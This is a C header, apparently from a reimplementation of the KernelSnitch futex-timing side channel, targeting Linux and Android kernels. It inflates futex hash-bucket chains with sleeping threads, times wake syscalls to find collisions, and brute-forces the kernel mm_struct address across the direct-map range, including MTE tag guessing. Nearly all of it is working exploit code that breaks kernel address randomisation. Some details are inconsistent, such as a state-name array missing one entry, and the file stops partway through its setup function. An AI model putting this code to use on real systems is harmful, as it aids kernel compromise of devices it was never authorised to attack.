#pragma once

#include "timeutils.h"
#include "utils.h"
#include "futex_hash.h"

#include <linux/futex.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <stdatomic.h>

#if !defined(__ARM) && !defined(__INTEL) && !defined(__AMD)
#define __INTEL
#endif

#define FUTEX_SZ (1ULL<<30)
#define FUTEX_MMAP_SZ (1ULL<<30)
#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
#ifndef KS_PAGE_SIZE
#define KS_PAGE_SIZE PAGE_SIZE
#endif
#ifndef APPENDED_FUTEXES
#define APPENDED_FUTEXES 256
#endif
#define MULITPLE 4
#define KS_RUN16_COLLISIONS 32
#define KS_RUN16_VOTING_ROUNDS 3
#define KS_V4_SAME_PAGE_OFFSETS 512
#define KS_V5_PAGE_SCAN_COUNT 128
#define KS_V5_SELFTEST_OFFSETS 32
#define KS_V9_SINGLE_TARGET_PAGE KS_PAGE_SIZE
#define KS_V9_DISC_MAX (KS_V5_PAGE_SCAN_COUNT * KS_V4_SAME_PAGE_OFFSETS)
#define KS_V9_MIN_SURVIVORS 11
#define KS_MM_STRUCT_STRIDE 0x3c0
#define KS_MM_STRUCT_ALIGN 0x40
#if defined(__INTEL) || defined(__AMD)
#define IDENTITY_START 0xffff888000000000ULL
#define IDENTITY_END   0xffffc88000000000ULL
#define COARSE_SZ (1ULL << 30)
#elif defined(__ARM)
#define VA_BITS 39
#if VA_BITS==39
#ifndef KERNELSNITCH_IDENTITY_START
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#endif
#ifndef KERNELSNITCH_IDENTITY_END
#define KERNELSNITCH_IDENTITY_END (KERNELSNITCH_IDENTITY_START + (64ULL<<30))
#endif
#define IDENTITY_START KERNELSNITCH_IDENTITY_START
#define IDENTITY_END   KERNELSNITCH_IDENTITY_END
// #define IDENTITY_END   0xffffffc000000000ULL
#elif VA_BITS==48
#define IDENTITY_START 0xffff000000000000ULL
#define IDENTITY_END   0xffff800000000000ULL
#else
#error "Unsupported VA_BITS (expected 39 or 48)"
#endif
#define COARSE_SZ (1ULL << 30)
#endif

enum kernelsnitch_state {
    KERNELSNITCH_NOT_INIT = 0,
    KERNELSNITCH_INIT,
    KERNELSNITCH_COLLISIONS_FOUND,
    KERNELSNITCH_COLLISIONS_NOT_FOUND,
    KERNELSNITCH_MM_FOUND,
    KERNELSNITCH_MM_NOT_FOUND,
    KERNELSNITCH_LAST,
};
char *kernelsnitch_strings[KERNELSNITCH_LAST] = {
    "not initialized",
    "initialized",
    "collisions found",
    "mm_struct found",
    "mm_struct not found",
};

struct kernelsnitch_shared_state {
    volatile size_t mm_struct_sz;
    volatile size_t mm_slab_order;
    volatile size_t verbose;

    size_t collisions;
    size_t thread_cnt;
    size_t cpu_cnt;
    size_t futex_hash_table_size;
    size_t total_futexes;
    volatile size_t identity_start; /* runtime-clamped scan window start */
    volatile size_t identity_end;   /* runtime-clamped scan window end */
    volatile size_t ram_bytes;      /* detected MemTotal, for post-validation */

    volatile unsigned char *futexes;
    volatile unsigned char inc_futex[KS_PAGE_SIZE];

    volatile size_t *futex_addrs;
    volatile size_t target_addr;
    volatile size_t anchor_addr;
    volatile size_t *candidate_addrs;
    volatile size_t candidate_count;
    volatile size_t candidate_max;
    volatile size_t *times;
    volatile size_t *t_before;
    volatile size_t *times2;
    volatile size_t *t_before2;
    volatile size_t *times3;
    volatile size_t *candidate1_idx;
    volatile size_t *candidate2_idx;
    volatile size_t *candidate3_idx;
    volatile size_t *stable_candidate_idx;
    volatile size_t *accepted_idx;
    volatile size_t candidate1_count;
    volatile size_t candidate2_count;
    volatile size_t candidate3_count;
    volatile size_t stable_candidate_count;
    volatile size_t accepted_count;
    volatile size_t rounds_completed;
    volatile size_t validation_target_checked;
    volatile size_t validation_target_passed;
    volatile size_t validation_candidate_checked;
    volatile size_t validation_candidate_passed;
    volatile size_t validation_candidate_candidate_checked;
    volatile size_t validation_candidate_candidate_passed;
    volatile size_t *candidate_t2c_votes;
    volatile size_t *candidate_c2t_votes;
    volatile size_t *candidate_c2c_votes;
    volatile size_t *candidate_c2c_before;
    volatile size_t *candidate_c2c_after;
    volatile size_t *candidate_initial_before;
    volatile size_t *candidate_initial_after;
    volatile size_t v5_page_count;
    volatile size_t v5_selected_page;
    volatile size_t v5_selected_candidates;
    volatile size_t *v9_disc_idx;
    volatile size_t *v9_disc_t2c_votes;
    volatile size_t *v9_disc_c2t_votes;
    volatile size_t *v9_disc_t2c_before;
    volatile size_t *v9_disc_t2c_after;
    volatile size_t *v9_disc_c2t_before;
    volatile size_t *v9_disc_c2t_after;
    volatile size_t v9_disc_count;
    volatile size_t v9_strict_count;
    volatile size_t *candidate_t2c_before;
    volatile size_t *candidate_t2c_after;
    volatile size_t *candidate_c2t_before;
    volatile size_t *candidate_c2t_after;
    volatile size_t pile2_anchor;
    volatile size_t pile2_anchor_id;
    volatile size_t found;
    volatile size_t mm_struct;
    volatile size_t dbg_any_match; /* diagnostic: candidates where >=2 addrs share a bucket */

    pthread_t *tids;
    size_t identity_diff;

    enum kernelsnitch_state state;

    int mte_enabled;
};

#define WAIT() do { for (size_t i = 0; i < 2; ++i) sched_yield(); } while (0)

/**
 * FUTEX syscall
 */
static int __futex(unsigned int *uaddr, int futex_op, unsigned int val, const struct timespec *timeout, unsigned int *uaddr2, unsigned int val3)
{
    return syscall(SYS_futex, uaddr, futex_op, val, timeout, uaddr2, val3);
}

/**
 * Do a private futex wait to increase the hash bucket of futex_hash(ks->inc_futex[id], current->mm_struct)
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.id: identifier of the futex user-space address to be used for the increase
 */
struct inc_arg {
    struct kernelsnitch_shared_state *ks;
    unsigned int *uaddr;
    atomic_size_t *active;
    int futex_op;
    unsigned int val3;
    size_t core;
};
static void *__do_increase(void *arg)
{
    struct inc_arg *inc_arg = (struct inc_arg *)arg;
    size_t core = inc_arg->core;
    int futex_rc;
    /* pin this piled waiter away from the measuring core to avoid preempting it */
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core, &cpuset);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
    atomic_fetch_add_explicit(inc_arg->active, 1, memory_order_acq_rel);
    futex_rc = __futex(inc_arg->uaddr, inc_arg->futex_op, 0, NULL, NULL,
                       inc_arg->val3);
    atomic_fetch_sub_explicit(inc_arg->active, 1, memory_order_acq_rel);
    if (futex_rc == -1)
        pr_error("pile futex_wait failed errno=%d\n", errno);
    free(inc_arg);
    return 0;
}

static void ks_partial_hex_value(unsigned long long value, char *out, size_t out_sz)
{
    snprintf(out, out_sz, "%016llx", value);
}

static void ks_partial_boot_info(char *boot_id, size_t boot_sz,
                                 unsigned long long *uptime_ms)
{
    FILE *f = fopen("/proc/sys/kernel/random/boot_id", "r");
    char line[128];

    boot_id[0] = 0;
    *uptime_ms = 0;
    if (f) {
        if (fgets(line, (int)(sizeof(line) < boot_sz ? sizeof(line) : boot_sz), f)) {
            line[strcspn(line, "\r\n")] = 0;
            snprintf(boot_id, boot_sz, "%s", line);
        }
        fclose(f);
    }
    f = fopen("/proc/uptime", "r");
    if (f) {
        if (fgets(line, sizeof(line), f))
            *uptime_ms = (unsigned long long)(atof(line) * 1000.0);
        fclose(f);
    }
}

static int ks_partial_open(const char *path)
{
    const char *tr = getenv("KS_TRUNCATE_PARTIAL");
    int flags = O_WRONLY | O_CREAT | O_CLOEXEC;
    int fd;

    if (tr && strcmp(tr, "1") == 0)
        flags |= O_TRUNC;
    fd = open(path, flags, 0666);
    if (fd < 0)
        return fd;
    lseek(fd, 0, SEEK_END);
    return fd;
}

static void ks_partial_write_all(int fd, const char *buf, size_t len)
{
    size_t used = 0;

    while (used < len) {
        ssize_t n = write(fd, buf + used, len - used);
        if (n <= 0) {
            if (n < 0 && (errno == EINTR || errno == EAGAIN))
                continue;
            return;
        }
        used += (size_t)n;
    }
}

static void ks_partial_emit(int *fd, const char *path, const char *header,
                            const char *fmt, va_list ap)
{
    char line[512];
    int n;

    if (*fd < 0) {
        char boot_id[64];
        unsigned long long uptime_ms;
        int append = 0;
        off_t at = lseek(*fd, 0, SEEK_END);
        (void)at;
        *fd = ks_partial_open(path);
        if (*fd < 0)
            return;
        if (lseek(*fd, 0, SEEK_END) > 0)
            append = 1;
        ks_partial_boot_info(boot_id, sizeof(boot_id), &uptime_ms);
        n = snprintf(line, sizeof(line),
                     "%s run=v15 append=%d boot_id=%s uptime_ms=%llu\n",
                     header, append, boot_id, uptime_ms);
        if (n > 0) {
            ks_partial_write_all(*fd, line, (size_t)n);
            fsync(*fd);
        }
    }
    n = vsnprintf(line, sizeof(line), fmt, ap);
    if (n <= 0)
        return;
    ks_partial_write_all(*fd, line, (size_t)n);
    fsync(*fd);
}

static void ks_partial_candidate_write(const char *fmt, ...)
{
    static int fd = -1;
    va_list ap;

    va_start(ap, fmt);
    ks_partial_emit(&fd, "/data/local/tmp/ks_collisions_partial.txt",
                    "partial_header=1 pages_total=128", fmt, ap);
    va_end(ap);
}

static void ks_stage_partial_writef(const char *fmt, ...)
{
    static int fd = -1;
    va_list ap;

    va_start(ap, fmt);
    ks_partial_emit(&fd, "/data/local/tmp/ks_stage_partial.txt",
                    "stage_header=1", fmt, ap);
    va_end(ap);
}

/**
 * Creates threads and put them to sleep to increase the chain of a hash bucket
 * @arg ks: shared KernelSnitch state
 * @arg id: identifier of the futex user-space address to be used for the increase
 * @arg amount: increase
 */
static volatile size_t ks_v15_piles_created;
static volatile size_t ks_v15_piles_failed;
static volatile size_t ks_v15_waiters_queued;
static volatile size_t ks_v15_waiters_drained;

struct ks_pile_waiters {
    pthread_t *tids;
    unsigned int *uaddr;
    atomic_size_t active;
    size_t created;
    size_t joined;
};

static int __increase_addr_abort(struct ks_pile_waiters *pile)
{
    size_t created = pile ? pile->created : 0;
    struct timespec now;
    struct timespec start;
    size_t active;

    if (!pile || !pile->tids)
        return 0;
    clock_gettime(CLOCK_MONOTONIC, &start);
    while ((active = atomic_load_explicit(&pile->active,
                                          memory_order_acquire)) != 0) {
        __futex(pile->uaddr, FUTEX_WAKE_PRIVATE,
                (unsigned int)(created + 16), NULL, NULL, 0);
        WAIT();
        clock_gettime(CLOCK_MONOTONIC, &now);
        if (now.tv_sec - start.tv_sec >= 5) {
            pr_warning("KS_V15_PILE event=join_timeout addr=%016zx "
                       "active=%zu created=%zu requested=%zu errno=%d\n",
                       (size_t)pile->uaddr, active, created, created, ETIMEDOUT);
            errno = ETIMEDOUT;
            return -1;
        }
    }
    for (size_t i = 0; i < created; ++i)
        (void)pthread_join(pile->tids[i], NULL);
    atomic_store_explicit(&pile->active, 0, memory_order_release);
    ks_v15_waiters_drained += created;
    pr_info("KS_V15_PILE event=aborted addr=%016zx joined=%zu active=0 "
            "pile_created=%zu pile_failed=%zu queued=%zu drained=%zu\n",
            (size_t)pile->uaddr, created, (size_t)ks_v15_piles_created,
            (size_t)ks_v15_piles_failed, (size_t)ks_v15_waiters_queued,
            (size_t)ks_v15_waiters_drained);
    free(pile->tids);
    pile->tids = NULL;
    pile->uaddr = NULL;
    pile->created = 0;
    pile->joined = 0;
    return 0;
}

static int __increase_addr_drain(struct ks_pile_waiters *pile)
{
    size_t joined = 0;
    struct timespec now;
    struct timespec start;
    size_t active;

    if (!pile || !pile->tids) {
        errno = EINVAL;
        return -1;
    }
    clock_gettime(CLOCK_MONOTONIC, &start);
    while ((active = atomic_load_explicit(&pile->active,
                                          memory_order_acquire)) != 0) {
        __futex(pile->uaddr, FUTEX_WAKE_PRIVATE,
                (unsigned int)(pile->created + 16), NULL, NULL, 0);
        WAIT();
        clock_gettime(CLOCK_MONOTONIC, &now);
        if (now.tv_sec - start.tv_sec >= 5) {
            pr_warning("KS_V15_PILE event=join_timeout addr=%016zx "
                       "active=%zu created=%zu requested=%zu errno=%d\n",
                       (size_t)pile->uaddr, active, pile->created,
                       pile->created, ETIMEDOUT);
            errno = ETIMEDOUT;
            return -1;
        }
    }
    for (size_t i = 0; i < pile->created; ++i) {
        if (pthread_join(pile->tids[i], NULL) != 0) {
            pr_warning("KS_V15_PILE event=join_failed addr=%016zx index=%zu errno=%d created=%zu joined=%zu\n",
                       (size_t)pile->uaddr, i, errno, pile->created, joined);
            errno = EINVAL;
            return -1;
        }
        joined++;
    }
    ks_v15_waiters_drained += joined;
    pr_info("KS_V15_PILE event=drained addr=%016zx joined=%zu active=0 "
            "pile_created=%zu pile_failed=%zu queued=%zu drained=%zu\n",
            (size_t)pile->uaddr, joined, (size_t)ks_v15_piles_created,
            (size_t)ks_v15_piles_failed, (size_t)ks_v15_waiters_queued,
            (size_t)ks_v15_waiters_drained);
    free(pile->tids);
    pile->tids = NULL;
    pile->uaddr = NULL;
    pile->created = 0;
    pile->joined = joined;
    return 0;
}

/**
 * Creates threads and put them to sleep to increase the chain of a hash bucket
 * @arg ks: shared KernelSnitch state
 * @arg id: identifier of the futex user-space address to be used for the increase
 * @arg pile: waiter handle; must be drained exactly once on success
 */
static int __increase_addr(struct kernelsnitch_shared_state *ks, unsigned int *uaddr,
                           size_t amount, int futex_op, unsigned int val3,
                           struct ks_pile_waiters *pile)
{
    size_t ncpus = (size_t)sysconf(_SC_NPROCESSORS_ONLN);
    struct timespec now;
    struct timespec start;
    if (ncpus < 2) ncpus = 2;
    if (!uaddr || (((size_t)uaddr % sizeof(unsigned int)) != 0)) {
        errno = EINVAL;
        return -1;
    }
    if (!pile) {
        errno = EINVAL;
        return -1;
    }
    pile->tids = (pthread_t *)calloc(amount, sizeof(*pile->tids));
    if (!pile->tids) {
        errno = ENOMEM;
        return -1;
    }
    pile->uaddr = uaddr;
    atomic_store_explicit(&pile->active, 0, memory_order_release);
    pile->created = 0;
    pile->joined = 0;
    for (size_t i = 0; i < amount; ++i) {
        struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
        if (!inc_arg) {
            errno = ENOMEM;
            ks_v15_piles_failed++;
            pr_warning("KS_V15_PILE event=failed addr=%016zx reason=alloc "
                       "active=%zu created=%zu "
                       "requested=%zu errno=%d pile_created=%zu pile_failed=%zu "
                       "queued=%zu drained=%zu\n",
                       (size_t)uaddr,
                       atomic_load_explicit(&pile->active, memory_order_acquire),
                       i, amount, errno,
                       (size_t)ks_v15_piles_created,
                       (size_t)ks_v15_piles_failed,
                       (size_t)ks_v15_waiters_queued,
                       (size_t)ks_v15_waiters_drained);
            __increase_addr_abort(pile);
            return -1;
        }
        inc_arg->uaddr = uaddr;
        inc_arg->ks = ks;
        inc_arg->active = &pile->active;
        inc_arg->futex_op = futex_op;
        inc_arg->val3 = val3;
        inc_arg->core = 1 + (i % (ncpus - 1));  /* cores 1..N-1, keep core 0 for the measurer */
        if (pthread_create(&pile->tids[i], NULL, __do_increase,
                           (void *)inc_arg) != 0) {
            ks_v15_piles_failed++;
            free(inc_arg);
            pr_warning("KS_V15_PILE event=failed addr=%016zx reason=create "
                       "active=%zu created=%zu "
                       "requested=%zu errno=%d pile_created=%zu pile_failed=%zu "
                       "queued=%zu drained=%zu\n",
                       (size_t)uaddr,
                       atomic_load_explicit(&pile->active, memory_order_acquire),
                       i, amount, errno,
                       (size_t)ks_v15_piles_created,
                       (size_t)ks_v15_piles_failed,
                       (size_t)ks_v15_waiters_queued,
                       (size_t)ks_v15_waiters_drained);
            __increase_addr_abort(pile);
            return -1;
        }
        pile->created = i + 1;
        ks_v15_waiters_queued++;
    }
    clock_gettime(CLOCK_MONOTONIC, &start);
    while (atomic_load_explicit(&pile->active, memory_order_acquire) < amount) {
        clock_gettime(CLOCK_MONOTONIC, &now);
        if (now.tv_sec - start.tv_sec >= 5) {
            size_t active = atomic_load_explicit(&pile->active,
                                                 memory_order_acquire);
            ks_v15_piles_failed++;
            pr_warning("KS_V15_PILE event=failed addr=%016zx reason=settle "
                       "active=%zu requested=%zu created=%zu errno=%d "
                       "pile_created=%zu pile_failed=%zu queued=%zu drained=%zu\n",
                       (size_t)uaddr, active, amount, pile->created, ETIMEDOUT,
                       (size_t)ks_v15_piles_created,
                       (size_t)ks_v15_piles_failed,
                       (size_t)ks_v15_waiters_queued,
                       (size_t)ks_v15_waiters_drained);
            (void)__increase_addr_abort(pile);
            return -1;
        }
        WAIT();
    }
    ks_v15_piles_created++;
    pr_info("KS_V15_PILE event=created addr=%016zx created=%zu active=%zu "
            "pile_created=%zu pile_failed=%zu queued=%zu drained=%zu\n",
            (size_t)uaddr, amount,
            atomic_load_explicit(&pile->active, memory_order_acquire),
            (size_t)ks_v15_piles_created,
            (size_t)ks_v15_piles_failed, (size_t)ks_v15_waiters_queued,
            (size_t)ks_v15_waiters_drained);
    WAIT();
    return 0;
}

static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t amount)
{
    struct ks_pile_waiters pile;
    if (__increase_addr(ks, (unsigned int *)&ks->inc_futex[id], amount,
                        FUTEX_WAIT_PRIVATE, 0, &pile) == 0) {
        __futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAKE_PRIVATE,
                APPENDED_FUTEXES + 16, NULL, NULL, 0);
        (void)__increase_addr_drain(&pile);
    }
}

/**
 * Simple compare
 */
#define REPEAT_MEASUREMENT 128
#define AVERAGE (1<<3)
static int __compare(const void *a, const void *b)
{
    return (*(size_t *)a - *(size_t *)b);
}

static size_t __measure(size_t futex_addr);

/* Wait until the just-woken pile has drained.  A large waiter pile can keep
 * the bucket busy into the next round and make a real collider look quiet. */
static int __wait_bucket_idle(size_t probe_addr, size_t idle_time)
{
    for (size_t ms = 0; ms < 200; ++ms) {
        if (__measure(probe_addr) <= idle_time * 3)
            return 1;
        usleep(1000);
    }
    return 0;
}

/**
 * Performs the non-destructive traversal of the hashbucket futex_hash(futex_addr, current->mm_struct)
 * @arg futex_addr: user-space address of the futex (required only to be a mapped memory)
 * @return averaged time of the futex wait operation
 */
static size_t __measure(size_t futex_addr)
{
    size_t t0;
    size_t t1;
    size_t time = 0;
    // do some simple signal processing and reject bad ones
    size_t __times[REPEAT_MEASUREMENT];
    for (size_t l = 0; l < REPEAT_MEASUREMENT; ++l) {
        sched_yield();
        t0 = rdtsc_begin();
        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
        t1 = rdtsc_end();
        __times[l] = t1 - t0;
    }
    qsort(__times, REPEAT_MEASUREMENT, sizeof(size_t), __compare);
    for (size_t l = 0; l < AVERAGE; ++l)
        time += __times[l];
    time /= AVERAGE;
    return time;
}

/**
 * Performs the bruteforce leak in the range [start, end]
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.range: range of the bruteforce attempt
 */
struct range {
    size_t id;
    size_t start;
    size_t end;
};
struct mm_leak_arg {
    struct kernelsnitch_shared_state *ks;
    struct range range;
};
static void *__mm_leak(void *arg)
{
    struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)arg;
    struct kernelsnitch_shared_state *ks = mm_leak_arg->ks;
    struct range *range = &mm_leak_arg->range;
    extern int ks_pc_abort_check(uintptr_t *out) __attribute__((weak));
    uintptr_t pc_mm = 0;
    if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
    size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
    size_t scan_progress = 0;
    for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
        {
            size_t coarse_end = coarse_addr + COARSE_SZ;
            if (ks_pc_abort_check && ks_pc_abort_check(&pc_mm)) {
                ks->mm_struct = (size_t)pc_mm;
                ks->found = 1;
                break;
            }
            if (ks->verbose && ((++scan_progress % 4) == 0))
                pr_info("KS_SCAN_PROGRESS id=%zu coarse=%016zx end=%016zx\n",
                        range->id, coarse_addr, coarse_end);
            if (coarse_end > range->end) coarse_end = range->end;
            for (size_t slab_addr = coarse_addr; (slab_addr < coarse_end) && !ks->found; slab_addr += mm_slab_sz) {
                size_t slab_end = slab_addr + mm_slab_sz;
                if (slab_end > coarse_end) slab_end = coarse_end;
                size_t mm_struct_candidate = (slab_addr + KS_MM_STRUCT_ALIGN - 1) &
                                             ~(KS_MM_STRUCT_ALIGN - 1);
                for (; (mm_struct_candidate < slab_end) && !ks->found;
                     mm_struct_candidate += KS_MM_STRUCT_STRIDE) {

                size_t found_hash = 1;
                if (!ks->mte_enabled) {
                    // test the mm_struct candidate
                    size_t need = ks->accepted_count - 1;
                    size_t agree = 0;
                    for (size_t i = 1; i < ks->accepted_count; ++i)
                        if (futex_hash(ks->futex_addrs[0], mm_struct_candidate) == futex_hash(ks->futex_addrs[i], mm_struct_candidate))
                            agree++;
                    if (agree >= 1)
                        ks->dbg_any_match++;
                    found_hash = (agree >= need);
                    if (found_hash) {
                        ks->mm_struct = mm_struct_candidate;
                        if (ks->verbose)
                        pr_info("CANDIDATE mm=%016zx need=%zu\n",
                                mm_struct_candidate, need);
                        ks->found = 1;
                        break;
                    }
                } else {
                    // need to set the tag if mte is enabled
                    for (size_t tag_candidate = 0; tag_candidate < 15 && !ks->found; ++tag_candidate) {
                        size_t __mm_struct_candidate = mm_struct_candidate & ~(0xfULL << 56);
                        __mm_struct_candidate |= (tag_candidate << 56);
                        found_hash = 1;
                        for (size_t i = 1; i < ks->accepted_count && found_hash; ++i)
                            found_hash = (futex_hash(ks->futex_addrs[0], __mm_struct_candidate) == futex_hash(ks->futex_addrs[i], __mm_struct_candidate));
                        if (found_hash) {
                            if (ks->verbose)
                                pr_info("found mm_struct %016zx\n", __mm_struct_candidate);
                            ks->mm_struct = __mm_struct_candidate;
                            ks->found = 1;
                            break;
                        }
                    }
                }
            }
            }
        }
    }
    free(mm_leak_arg);
    return 0;
}

/****************************************************************************************************************/
/* EXTERNAL FUNCTIONS                                                                                           */
/****************************************************************************************************************/

/**
 * Setup phase of KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @arg __mm_slab_order: the order of the mm_struct slab
 * @arg __thread_cnt: thread count used for the bruteforcing phase
 * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
 * @arg __verbose: amount of print info (1...enabled; 0...disabled)
 * @arg __mte_enabled: is mte enabled on the victim system (1...enabled; 0...disabled)
 * @return shared KernelSnitch state
 */
struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
{
    struct kernelsnitch_shared_state *ks = SYSCHK(mmap(0, sizeof(struct kernelsnitch_shared_state), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    pr_info("KS_SETUP mark=1\n");
    ks_stage_partial_writef("stage=setup mark=1\n");
    ks->mm_struct = -1;
    ks->mm_struct_sz = __mm_struct_sz;
    ks->mm_slab_order = __mm_slab_order;
    ks->cpu_cnt = sysconf(_SC_NPROCESSORS_ONLN)*2;
    ks->thread_cnt = __thread_cnt;
    ks->collisions = __collision_cnt;
    ks->verbose = __verbose;
    ks->mte_enabled = __mte_enabled;
    ks->identity_start = IDENTITY_START;
    ks->identity_end = IDENTITY_END;
    ks->ram_bytes = 0;
    ks->dbg_any_match = 0;
    ks->target_addr = 0;
    ks->anchor_addr = 0;
    ks->validation_target_checked = 0;
    ks->validation_target_passed = 0;
    ks->validation_candidate_checked = 0;
    ks->validation_candidate_passed = 0;
    ks->validation_candidate_candidate_checked = 0;
    ks->validation_candidate_candidate_passed = 0;

    // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
    ks->futex_hash_table_size = 256*ks->cpu_cnt;
    ks->total_futexes = ks->futex_hash_table_size*ks->collisions*MULITPLE;
    ks->times = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->t_before = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->tids = (pthread_t *)SYSCHK(mmap(0, sizeof(pthread_t)*ks->thread_cnt, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->futexes = SYSCHK(mmap(0, FUTEX_SZ, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0));
    pr_info("KS_SETUP mark=2\n");
    ks_stage_partial_writef("stage=setup mark=2\n");
    for (size_t addr = 0; addr < FUTEX_SZ; addr += FUTEX_MMAP_SZ)
        SYSCHK(mmap((void *)((size_t)ks->futexes + addr), FUTEX_MMAP_SZ, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED|MAP_FIXED, -1, 0));
    pr_info("KS_SETUP mark=3\n");
    ks_stage_partial_writef("stage=setup mark=3\n");
    ks->identity_diff = ((IDENTITY_END - IDENTITY_START)/ks->thread_cnt);

    ks->futex_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->candidate_max = 4096;
    ks->candidate_count = 0;
    ks->candidate_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->candidate_max, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->times2 = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->t_before2 = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->times3 = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->candidate1_idx = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->candidate_max, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->candidate2_idx = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->candidate_max, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->candidate3_idx = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->candidate_max, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->stable_candidate_idx = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->candidate_max, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->accepted_idx = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->candidate_t2c_votes = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->candidate_max, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->candidate_c2t_votes = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->candidate_max, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->candidate_c2c_votes = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->candidate_max, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->candidate_t2c_before = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->candidate_max*KS_RUN16_VOTING_ROUNDS, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->candidate_t2c_after = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->candidate_max*KS_RUN16_VOTING_ROUNDS, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->candidate_c2t_before = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->candidate_max*KS_RUN16_VOTING_ROUNDS, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->candidate_c2t_after = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->candidate_max*KS_RUN16_VOTING_ROUNDS, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->candidate_c2c_before = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->candidate_max*KS_RUN16_VOTING_ROUNDS, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->candidate_c2c_after = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->candidate_max*KS_RUN16_VOTING_ROUNDS, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->candidate_initial_before = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->candidate_max, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->candidate_initial_after = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->candidate_max, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    pr_info("KS_SETUP mark=4\n");
    ks_stage_partial_writef("stage=setup mark=4\n");
    ks->v9_disc_idx = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*KS_V9_DISC_MAX, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
